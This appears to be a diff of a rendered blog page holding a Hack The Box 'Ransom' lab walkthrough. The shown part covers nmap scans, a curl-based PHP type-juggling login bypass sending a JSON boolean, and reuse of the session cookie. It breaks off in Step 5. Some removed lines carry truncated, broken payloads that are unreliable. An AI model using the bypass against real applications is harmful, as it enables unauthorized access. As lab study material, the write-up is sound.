@@ -4,69 +4,67 @@
 19:I[484,[],"OutletBoundary"]
 1a:"$Sreact.suspense"
 :HL["/writing/covers/hackthebox-ransom-walkthrough.webp","image"]
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Ransom Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Ransom machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:00:34.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[12," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-ransom-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Ransom machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Ransom machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/ransom","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","mindset-and-methodology",{"children":["$","a",null,{"href":"#mindset-and-methodology","children":"Mindset & Methodology"}]}],["$","li","step-1-port-scanning",{"children":["$","a",null,{"href":"#step-1-port-scanning","children":"Step 1 — Port Scanning"}]}],["$","li","step-2-service-enumeration",{"children":["$","a",null,{"href":"#step-2-service-enumeration","children":"Step 2 — Service Enumeration"}]}],["$","li","step-3-web-reconnaissance",{"children":["$","a",null,{"href":"#step-3-web-reconnaissance","children":"Step 3 — Web Reconnaissance"}]}],["$","li","step-4-login-bypass-php-type-juggling",{"children":["$","a",null,{"href":"#step-4-login-bypass-php-type-juggling","children":"Step 4 — Login Bypass (PHP Type Juggling)"}]}],["$","li","step-5-authenticated-session-and-file-download",{"children":"$L4"}],"$L5","$L6","$L7","$L8","$L9","$La","$Lb"]}]]}],"$Lc"],"$Ld","$Le",["$Lf","$L10","$L11"]]}],"$L12"]}]]}],"$L13"]}],"$L14","$L15"],null,"$L16"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"zs2c_HJI2CXWwLDIPVraL"}
-4:["$","a",null,{"href":"#step-5-authenticated-session-and-file-download","children":"Step 5 — Authenticated Session & File Download"}]
-5:["$","li","step-6-analyzing-the-encrypted-zip",{"children":["$","a",null,{"href":"#step-6-analyzing-the-encrypted-zip","children":"Step 6 — Analyzing the Encrypted ZIP"}]}]
-6:["$","li","step-7-known-plaintext-attack-with-bkcrack",{"children":["$","a",null,{"href":"#step-7-known-plaintext-attack-with-bkcrack","children":"Step 7 — Known-Plaintext Attack with bkcrack"}]}]
-7:["$","li","step-8-unlocking-the-zip-and-extracting-the-ssh-key",{"children":["$","a",null,{"href":"#step-8-unlocking-the-zip-and-extracting-the-ssh-key","children":"Step 8 — Unlocking the ZIP & Extracting the SSH Key"}]}]
-8:["$","li","step-9-ssh-access-as-htb",{"children":["$","a",null,{"href":"#step-9-ssh-access-as-htb","children":"Step 9 — SSH Access as htb"}]}]
-9:["$","li","step-10-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#step-10-privilege-escalation-to-root","children":"Step 10 — Privilege Escalation to Root"}]}]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Ransom Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A JSON boolean bypassed the Laravel login, a known-plaintext attack on the downloaded ZipCrypto backup recovered htb's SSH key, and the hardcoded application password in source also authenticated as root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:00:34.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[10," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-ransom-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Ransom machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Ransom machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/ransom","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","step-1-port-scanning",{"children":["$","a",null,{"href":"#step-1-port-scanning","children":"Step 1: Port Scanning"}]}],["$","li","step-2-service-enumeration",{"children":["$","a",null,{"href":"#step-2-service-enumeration","children":"Step 2: Service Enumeration"}]}],["$","li","step-3-web-reconnaissance",{"children":["$","a",null,{"href":"#step-3-web-reconnaissance","children":"Step 3: Web Reconnaissance"}]}],["$","li","step-4-login-bypass-php-type-juggling",{"children":["$","a",null,{"href":"#step-4-login-bypass-php-type-juggling","children":"Step 4: Login Bypass (PHP Type Juggling)"}]}],["$","li","step-5-authenticated-session-and-file-download",{"children":"$L4"}],"$L5","$L6","$L7","$L8","$L9","$La","$Lb"]}]]}],"$Lc"],"$Ld","$Le",["$Lf","$L10","$L11"]]}],"$L12"]}]]}],"$L13"]}],"$L14","$L15"],null,"$L16"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"EBRi0HxexS1XMGpfUl_9d"}
+4:["$","a",null,{"href":"#step-5-authenticated-session-and-file-download","children":"Step 5: Authenticated Session & File Download"}]
+5:["$","li","step-6-analyzing-the-encrypted-zip",{"children":["$","a",null,{"href":"#step-6-analyzing-the-encrypted-zip","children":"Step 6: Analyzing the Encrypted ZIP"}]}]
+6:["$","li","step-7-known-plaintext-attack-with-bkcrack",{"children":["$","a",null,{"href":"#step-7-known-plaintext-attack-with-bkcrack","children":"Step 7: Known-Plaintext Attack with bkcrack"}]}]
+7:["$","li","step-8-unlocking-the-zip-and-extracting-the-ssh-key",{"children":["$","a",null,{"href":"#step-8-unlocking-the-zip-and-extracting-the-ssh-key","children":"Step 8: Unlocking the ZIP & Extracting the SSH Key"}]}]
+8:["$","li","step-9-ssh-access-as-htb",{"children":["$","a",null,{"href":"#step-9-ssh-access-as-htb","children":"Step 9: SSH Access as htb"}]}]
+9:["$","li","step-10-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#step-10-privilege-escalation-to-root","children":"Step 10: Privilege Escalation to Root"}]}]
 a:["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key Lessons"}]}]
 b:["$","li","full-attack-chain-summary",{"children":["$","a",null,{"href":"#full-attack-chain-summary","children":"Full Attack Chain Summary"}]}]
-c:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",13," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","mindset-and-methodology",{"children":["$","a",null,{"href":"#mindset-and-methodology","children":"Mindset & Methodology"}]}],["$","li","step-1-port-scanning",{"children":["$","a",null,{"href":"#step-1-port-scanning","children":"Step 1 — Port Scanning"}]}],["$","li","step-2-service-enumeration",{"children":["$","a",null,{"href":"#step-2-service-enumeration","children":"Step 2 — Service Enumeration"}]}],["$","li","step-3-web-reconnaissance",{"children":["$","a",null,{"href":"#step-3-web-reconnaissance","children":"Step 3 — Web Reconnaissance"}]}],["$","li","step-4-login-bypass-php-type-juggling",{"children":["$","a",null,{"href":"#step-4-login-bypass-php-type-juggling","children":"Step 4 — Login Bypass (PHP Type Juggling)"}]}],["$","li","step-5-authenticated-session-and-file-download",{"children":["$","a",null,{"href":"#step-5-authenticated-session-and-file-download","children":"Step 5 — Authenticated Session & File Download"}]}],["$","li","step-6-analyzing-the-encrypted-zip",{"children":["$","a",null,{"href":"#step-6-analyzing-the-encrypted-zip","children":"Step 6 — Analyzing the Encrypted ZIP"}]}],["$","li","step-7-known-plaintext-attack-with-bkcrack",{"children":["$","a",null,{"href":"#step-7-known-plaintext-attack-with-bkcrack","children":"Step 7 — Known-Plaintext Attack with bkcrack"}]}],["$","li","step-8-unlocking-the-zip-and-extracting-the-ssh-key",{"children":["$","a",null,{"href":"#step-8-unlocking-the-zip-and-extracting-the-ssh-key","children":"Step 8 — Unlocking the ZIP & Extracting the SSH Key"}]}],["$","li","step-9-ssh-access-as-htb",{"children":["$","a",null,{"href":"#step-9-ssh-access-as-htb","children":"Step 9 — SSH Access as htb"}]}],["$","li","step-10-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#step-10-privilege-escalation-to-root","children":"Step 10 — Privilege Escalation to Root"}]}],["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key Lessons"}]}],["$","li","full-attack-chain-summary",{"children":["$","a",null,{"href":"#full-attack-chain-summary","children":"Full Attack Chain Summary"}]}]]}]}]]}]
-d:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/6b1d02536f677f09f853ea8c29739182b0b2c0c1/HTB-Ransom.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 6b1d02536f67",""]}]]]}]
-e:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Ransom"," · Linux"," · Medium"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/ransom","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
+c:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",13," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","step-1-port-scanning",{"children":["$","a",null,{"href":"#step-1-port-scanning","children":"Step 1: Port Scanning"}]}],["$","li","step-2-service-enumeration",{"children":["$","a",null,{"href":"#step-2-service-enumeration","children":"Step 2: Service Enumeration"}]}],["$","li","step-3-web-reconnaissance",{"children":["$","a",null,{"href":"#step-3-web-reconnaissance","children":"Step 3: Web Reconnaissance"}]}],["$","li","step-4-login-bypass-php-type-juggling",{"children":["$","a",null,{"href":"#step-4-login-bypass-php-type-juggling","children":"Step 4: Login Bypass (PHP Type Juggling)"}]}],["$","li","step-5-authenticated-session-and-file-download",{"children":["$","a",null,{"href":"#step-5-authenticated-session-and-file-download","children":"Step 5: Authenticated Session & File Download"}]}],["$","li","step-6-analyzing-the-encrypted-zip",{"children":["$","a",null,{"href":"#step-6-analyzing-the-encrypted-zip","children":"Step 6: Analyzing the Encrypted ZIP"}]}],["$","li","step-7-known-plaintext-attack-with-bkcrack",{"children":["$","a",null,{"href":"#step-7-known-plaintext-attack-with-bkcrack","children":"Step 7: Known-Plaintext Attack with bkcrack"}]}],["$","li","step-8-unlocking-the-zip-and-extracting-the-ssh-key",{"children":["$","a",null,{"href":"#step-8-unlocking-the-zip-and-extracting-the-ssh-key","children":"Step 8: Unlocking the ZIP & Extracting the SSH Key"}]}],["$","li","step-9-ssh-access-as-htb",{"children":["$","a",null,{"href":"#step-9-ssh-access-as-htb","children":"Step 9: SSH Access as htb"}]}],["$","li","step-10-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#step-10-privilege-escalation-to-root","children":"Step 10: Privilege Escalation to Root"}]}],["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key Lessons"}]}],["$","li","full-attack-chain-summary",{"children":["$","a",null,{"href":"#full-attack-chain-summary","children":"Full Attack Chain Summary"}]}]]}]}]]}]
+d:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/6b1d02536f677f09f853ea8c29739182b0b2c0c1/HTB-Ransom.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 6b1d02536f67",""]}]]]}]
+e:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Ransom, Linux, Medium",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/ransom","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
 f:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Ransom machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-10:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-11:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"9 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-17:T51f2,
-<p><strong>Difficulty:</strong> Medium<br /><strong>OS:</strong> Linux<br /><strong>IP:</strong> 10.129.227.93<br /><strong>Attacker IP:</strong> 10.10.16.84  </p>
-<hr />
+10:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+11:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"3 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+17:T478e,<p><strong>Difficulty:</strong> Medium<br><strong>OS:</strong> Linux<br><strong>IP:</strong> 10.129.227.93<br><strong>Attacker IP:</strong> 10.10.16.84  </p>
+<hr>
 
 
 
-<h2 id="mindset-and-methodology">Mindset &amp; Methodology</h2>
-<p>Before touching a single tool, understand <strong>why</strong> we follow a process:</p>
+<h2 id="attack-chain">Attack chain</h2>
+<p>Ransom follows four stages:</p>
 <blockquote>
 <p>A hacker is not someone who randomly tries things. A hacker is someone who <strong>understands systems deeply enough to make them do something unintended</strong>.</p>
 </blockquote>
 <p>The methodology here is:</p>
 <ol>
-<li><strong>Enumerate</strong> — find every door and window before trying to open one</li>
-<li><strong>Understand</strong> — know what tech stack you're dealing with before attacking it</li>
-<li><strong>Exploit</strong> — use the smallest, most precise attack that works</li>
-<li><strong>Escalate</strong> — once inside, treat the system like a puzzle; what was left behind?</li>
+<li><strong>Enumerate</strong> : find every door and window before trying to open one</li>
+<li><strong>Understand</strong> : know what tech stack you're dealing with before attacking it</li>
+<li><strong>Exploit</strong> : use the smallest, most precise attack that works</li>
+<li><strong>Escalate</strong> : once inside, treat the system like a puzzle; what was left behind?</li>
 </ol>
 <p>Every step below follows this loop.</p>
-<hr />
-<h2 id="step-1-port-scanning">Step 1 — Port Scanning</h2>
-<h3 id="what-we-do">What we do</h3>
+<hr>
+<h2 id="step-1-port-scanning">Step 1: Port Scanning</h2>
+
 <pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.93
 </code></pre>
-<h3 id="why">Why</h3>
+
 <p>Before anything else, we need to know what services are <strong>listening for connections</strong>. A port is a numbered door on a machine. Open ports = potential entry points.</p>
 <ul>
 <li><code>-p-</code> means scan <strong>all 65535 ports</strong>, not just the common top 1000. Defenders sometimes hide services on unusual ports. We never assume only standard ports are in use.</li>
-<li><code>--min-rate 10000</code> speeds the scan up significantly. On HTB, speed is fine — in real engagements you'd slow down to avoid detection.</li>
+<li><code>--min-rate 10000</code> speeds the scan up significantly. On HTB, speed is fine - in real engagements you'd slow down to avoid detection.</li>
 </ul>
-<h3 id="hacker-mindset">Hacker Mindset</h3>
-<blockquote>
-<p>"I don't know what's running yet. I cast a wide net first, then I get precise."</p>
-</blockquote>
-<h3 id="result">Result</h3>
+
+
+
+
 <pre><code>22/tcp open  ssh
 80/tcp open  http
 </code></pre>
-<p>Two ports. Small attack surface. Both are standard — SSH for remote shell access and HTTP for a web application. The web app is almost always the primary entry point on HTB boxes.</p>
-<hr />
-<h2 id="step-2-service-enumeration">Step 2 — Service Enumeration</h2>
-<h3 id="what-we-do-2">What we do</h3>
+<p>Two ports. Small attack surface. Both are standard - SSH for remote shell access and HTTP for a web application. The web app is almost always the primary entry point on HTB boxes.</p>
+<hr>
+<h2 id="step-2-service-enumeration">Step 2: Service Enumeration</h2>
+
 <pre><code class="language-bash" data-language="bash">nmap -p 22,80 -sCV 10.129.227.93
 </code></pre>
-<h3 id="why-2">Why</h3>
+
 <p>Now we know the doors exist. We need to know <strong>what's behind each door</strong>. This scan:</p>
 <ul>
-<li><code>-sC</code> runs default scripts — they probe each service and pull useful info automatically</li>
+<li><code>-sC</code> runs default scripts - they probe each service and pull useful info automatically</li>
 <li><code>-sV</code> detects the exact software version running</li>
 </ul>
 <p>Version information is critical because:</p>
@@ -75,36 +73,35 @@ f:["$","div","lab-archive-0",{"className":"article-review-note article-review-la
 <li>Version info tells us the OS (Ubuntu 20.04 in this case from OpenSSH version)</li>
 <li>Framework versions affect what vulnerabilities exist</li>
 </ul>
-<h3 id="result-2">Result</h3>
+
 <pre><code>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
 80/tcp open  http    Apache httpd 2.4.41
                      Redirected to http://10.129.227.93/login
 </code></pre>
 <p>Key observations:</p>
 <ul>
-<li>SSH is OpenSSH 8.2p1 — no known exploitable CVEs, so we park this for now</li>
-<li>The web server redirects to <code>/login</code> — there's a login page we need to deal with</li>
-<li>Apache 2.4.41 + Ubuntu 20.04 focal — this helps if we need to match exploits later</li>
+<li>SSH is OpenSSH 8.2p1 - no known exploitable CVEs, so we park this for now</li>
+<li>The web server redirects to <code>/login</code> : there's a login page we need to deal with</li>
+<li>Apache 2.4.41 + Ubuntu 20.04 focal - this helps if we need to match exploits later</li>
 </ul>
-<h3 id="hacker-mindset-2">Hacker Mindset</h3>
-<blockquote>
+
 <p>"SSH with no CVEs = not my first target. The web app is where the action is."</p>
-</blockquote>
-<hr />
-<h2 id="step-3-web-reconnaissance">Step 3 — Web Reconnaissance</h2>
-<h3 id="what-we-do-3">What we do</h3>
+
+<hr>
+<h2 id="step-3-web-reconnaissance">Step 3: Web Reconnaissance</h2>
+
 <p>Visit <code>http://10.129.227.93</code> in a browser (or curl). Observe the login page. View page source.</p>
 <pre><code class="language-bash" data-language="bash">curl -s http://10.129.227.93/login | grep -A 30 '&lt;script&gt;'
 </code></pre>
-<h3 id="why-3">Why</h3>
-<p>When you see a login page, don't immediately start guessing passwords. <strong>Read the code first</strong>. Modern web apps handle login through JavaScript — understanding how the JS works tells you exactly what request is being made, to which endpoint, with what parameters.</p>
+
+<p>When you see a login page, don't immediately start guessing passwords. <strong>Read the code first</strong>. Modern web apps handle login through JavaScript - understanding how the JS works tells you exactly what request is being made, to which endpoint, with what parameters.</p>
 <p>From the page source, the relevant JavaScript is:</p>
 <pre><code class="language-javascript" data-language="javascript">$('#loginform').submit(function() {
     $.ajax({
         type: "GET",
         url: 'api/login',
         data: {
-            password: null
+            password: $("#password").val()
         },
         success: function(data) {
             if (data === 'Login Successful') {
@@ -116,20 +113,19 @@ f:["$","div","lab-archive-0",{"className":"article-review-note article-review-la
 </code></pre>
 <h3 id="what-this-tells-us">What this tells us</h3>
 <ol>
-<li>Login is a <strong>GET request</strong> to <code>/api/login</code> — unusual. Normally logins are POST.</li>
-<li>The password is REDACTED as a <strong>URL query parameter</strong>: <code>/api/login?password=REDACTED</code></li>
+<li>Login is a <strong>GET request</strong> to <code>/api/login</code> : unusual. Normally logins are POST.</li>
+<li>The password is sent as a <strong>URL query parameter</strong>: <code>/api/login?password=...</code></li>
 <li>The server responds with the string <code>"Login Successful"</code> or <code>"Invalid Login"</code></li>
 </ol>
-<h3 id="hacker-mindset-3">Hacker Mindset</h3>
-<blockquote>
-<p>"The login is using GET — that's already weird. Passwords in GET requests get logged everywhere. What else is non-standard here? What if I change the data format?"</p>
-</blockquote>
+
+<p>"The login is using GET - that's already weird. Passwords in GET requests get logged everywhere. What else is non-standard here? What if I change the data format?"</p>
+
 <p>We also identify the tech stack:</p>
 <pre><code class="language-bash" data-language="bash">curl -I http://10.129.227.93
 </code></pre>
 <p>Response headers show <code>laravel_session</code> cookies → this is a <strong>Laravel</strong> (PHP framework) application. This is critical because Laravel has specific behaviors around how it parses request bodies.</p>
-<hr />
-<h2 id="step-4-login-bypass-php-type-juggling">Step 4 — Login Bypass (PHP Type Juggling)</h2>
+<hr>
+<h2 id="step-4-login-bypass-php-type-juggling">Step 4: Login Bypass (PHP Type Juggling)</h2>
 <h3 id="the-vulnerability">The Vulnerability</h3>
 <p>Laravel (and PHP in general) can parse JSON bodies even on GET requests if the <code>Content-Type: application/json</code> header is present. More importantly, PHP's loose comparison operator <code>==</code> has a dangerous property:</p>
 <pre><code class="language-php" data-language="php">true == "any string at all"  // evaluates to TRUE
@@ -140,30 +136,29 @@ f:["$","div","lab-archive-0",{"className":"article-review-note article-review-la
     return "Login Successful";
 }
 </code></pre>
-<p>If we send <code>{"password": null</code> as JSON, PHP receives the boolean <code>true</code>, and <code>true == "UHC-March-Global-PW!"</code> evaluates to <code>true</code> — login bypassed.</p>
-<h3 id="what-we-do-4">What we do</h3>
+<p>If we send <code>{"password": true}</code> as JSON, PHP receives the boolean <code>true</code>, and <code>true == "UHC-March-Global-PW!"</code> evaluates to <code>true</code> - login bypassed.</p>
+
 <pre><code class="language-bash" data-language="bash">curl -s -X GET http://10.129.227.93/api/login \
   -H 'Content-Type: application/json' \
-  -d '{"password": null
+  -d '{"password": true}'
 </code></pre>
-<h3 id="why-this-works-step-by-step">Why this works step by step</h3>
+<h3 id="mechanism-step-by-step">Mechanism step by step</h3>
 <ol>
 <li>We send a <strong>GET request</strong> (matching the only allowed method)</li>
-<li>We set <code>Content-Type: application/json</code> — this tells Laravel to parse the body as JSON</li>
+<li>We set <code>Content-Type: application/json</code> : this tells Laravel to parse the body as JSON</li>
 <li>Laravel's request object reads <code>password</code> from the JSON body</li>
 <li>PHP compares: <code>true == "UHC-March-Global-PW!"</code> → <code>true</code></li>
 <li>Server returns: <code>"Login Successful"</code></li>
 </ol>
-<h3 id="hacker-mindset-4">Hacker Mindset</h3>
-<blockquote>
-<p>"The endpoint only accepts GET. I can't brute force. I don't know the password. But I can change the <em>type</em> of what I'm sending. What if I don't send a string? What if I send a boolean?"</p>
-</blockquote>
-<p>This is the core of type juggling attacks: <strong>don't just try different values — try different data types</strong>.</p>
-<h3 id="result-3">Result</h3>
+
+
+
+<p>This is the core of type juggling attacks: <strong>don't just try different values - try different data types</strong>.</p>
+
 <pre><code>Login Successful
 </code></pre>
-<hr />
-<h2 id="step-5-authenticated-session-and-file-download">Step 5 — Authenticated Session &amp; File Download</h2>
+<hr>
+<h2 id="step-5-authenticated-session-and-file-download">Step 5: Authenticated Session &amp; File Download</h2>
 <h3 id="the-problem">The problem</h3>
 <p>Getting <code>"Login Successful"</code> from the API is not enough on its own. The browser maintains a <strong>session cookie</strong> that tracks whether you're logged in. We need to:</p>
 <ol>
@@ -171,26 +166,26 @@ f:["$","div","lab-archive-0",{"className":"article-review-note article-review-la
 <li>Send the bypass through that same session</li>
 <li>Use the now-authenticated session to browse the app</li>
 </ol>
-<h3 id="what-we-do-5">What we do</h3>
+
 <pre><code class="language-bash" data-language="bash"># Step 1: Get the session cookie
 curl -s -c /tmp/cookies.txt http://10.129.227.93/login &gt; /dev/null
 
 # Step 2: Authenticate using the bypass
 curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt -X GET http://10.129.227.93/api/login \
   -H 'Content-Type: application/json' \
-  -d '{"password": null
+  -d '{"password": true}'
 
 # Step 3: Access the authenticated page and find file links
 curl -s -b /tmp/cookies.txt http://10.129.227.93/ -o /tmp/page.html
 grep -oP 'href="[^"]*"' /tmp/page.html
 </code></pre>
-<h3 id="why-4">Why</h3>
+
 <ul>
 <li><code>-c /tmp/cookies.txt</code> saves cookies to a file</li>
 <li><code>-b /tmp/cookies.txt</code> sends those saved cookies with each request</li>
-<li>This simulates what a browser does automatically — maintaining session state</li>
+<li>This simulates what a browser does automatically - maintaining session state</li>
 </ul>
-<h3 id="result-4">Result</h3>
+
 <p>Two interesting links on the authenticated page:</p>
